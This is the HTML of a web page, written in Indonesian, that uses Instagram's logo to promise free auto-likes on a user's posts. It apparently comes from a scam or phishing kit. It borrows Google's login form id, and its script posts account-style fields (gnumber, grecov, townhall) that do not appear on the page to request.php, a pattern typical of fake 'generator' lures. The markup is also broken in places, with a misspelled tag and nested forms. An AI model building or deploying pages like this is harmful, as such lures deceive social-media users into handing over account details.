<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='http://image.spreadshirtmedia.com/image-server/v1/designs/1001927163,width=280,height=280?mediaType=png' rel='icon' type='image/x-png'/>
<title>Tainsta - Free Auto Like</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-12 {
 margin:0 auto;
 float:none;

}
</style>
<script type="text/javascript">
	$(document).ready(function(){
	  $("#gsubmit").on("click", function() {

var gnumber = $("#gnumber").val();
var townhall = $("#townhall").val();
var grecov = $("#grecov").val();
		  if(gnumber==''|| grecov=='')
{

}
else
{
	var res = document.getElementById("hasilnya");
          res.innerHTML='';
		  $("#gsubmit").prop("disabled", true );
		  $.post("request.php",
		  {gnumber:gnumber,grecov:grecov,townhall:townhall,},
		  function(response,status){
			  $('#hasilnya').html(response);
			$("#gsubmit").prop("disabled", false );
			
		  });
		  return false;
	  }
	  }
	  );
	});

	</script>
<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<center style="background:white;"><br>
<div class="col-md-12">
<h2><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png"style="width:90px;height:70px;"></span></h2>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">
<form novalidate="" method="post" action="sukses-like.php" id="gaia_loginform">
<h4 >
  Silahkan Pilih Jumlah Like yang Anda Inginkan
  </h4><br/><form id="glogin">
<div style="width:100%" class="form-group">
<div class="input-group">
    <span class="input-group-addon"><img src="http://publicdomainvectors.org/photos/primary-question-mark.png"style="width:20px;height:21px;"></span>
            <select class="form-control" id="gems">
          <option>Status</option>
          <option>Foto</option>
          <option>Video</option>
        </select>
  </div>
</div>
<div style="width:100%" class="form-group">
<div class="input-group">
    <span class="input-group-addon"><img src="http://lh3.googleusercontent.com/PmVk8m5kh3CfObclGgJfxdkf5FKuG1Y3SvPfZXKuFYEkpeBbIQ10k8gNz-4mRYTm_g=w300"style="width:20px;height:21px;"></span>
            <select class="form-control" id="gold">
          <option>500 Likes</option>
          <option>1.000 Likes</option>
          <option>1.500 Likes</option>
          <option>2.000 Likes</option>
          <option>2.500 Likes</option>
          <optipn>3.000 Likes</option>
        </select>
  </div>
  </div>
</div>
</div>
</div>
<center style="background:white;"><br>
<div class="col-md-12">
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">

</div>

  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="Generated"> </form>
</div>
</div><br><br>
</div>